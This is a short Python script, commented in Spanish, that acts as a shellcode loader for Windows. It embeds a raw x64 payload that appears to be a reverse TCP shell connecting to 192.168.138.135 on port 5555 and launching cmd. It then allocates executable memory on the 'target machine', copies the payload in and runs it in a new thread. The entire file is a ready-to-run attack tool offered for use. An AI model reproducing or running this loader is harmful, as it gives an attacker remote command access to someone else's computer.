import ctypes
import sys

# Buffer que contiene el shellcode
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x8a\x87\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
buf += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
buf += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
buf += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
buf += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
buf += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
buf += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
buf += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
buf += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
buf += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
buf += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
buf += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
buf += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
buf += b"\x89\xda\xff\xd5"

# Verifica si estamos en Windows
if sys.platform != "win32":
    raise Exception("Este script debe ser ejecutado en Windows.")

# Cargar la librería Kernel32.dll
kernel32 = ctypes.windll.kernel32

# Especificar el tipo de retorno de la función VirtualAlloc
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

# Alojar memoria en la máquina objetivo
lpAddress = kernel32.VirtualAlloc(
    ctypes.c_void_p(0),  # Dirección de inicio (NULL)
    ctypes.c_size_t(len(buf)),  # Tamaño del buffer
    0x3000,  # Tipo de asignación: MEM_COMMIT | MEM_RESERVE
    0x40  # Permisos de memoria: PAGE_EXECUTE_READWRITE
)

# Verificar si la asignación de memoria falló
if not lpAddress:
    raise Exception("La asignación de memoria ha fallado.")

# Copiar el shellcode en la memoria alojada
ctypes.memmove(lpAddress, buf, len(buf))

# Crear un thread para ejecutar el shellcode
thread = kernel32.CreateThread(
    ctypes.c_void_p(0),  # Atributos de seguridad
    ctypes.c_size_t(0),  # Tamaño del stack (por defecto)
    ctypes.c_void_p(lpAddress),  # Dirección de inicio del thread
    ctypes.c_void_p(0),  # Parámetros del thread
    ctypes.c_ulong(0),  # Opciones de creación (por defecto)
    ctypes.pointer(ctypes.c_ulong(0))  # ID del thread
)

# Verificar si la creación del thread falló
if not thread:
    raise Exception("La creación del hilo ha fallado.")

# Esperar a que el thread termine
kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
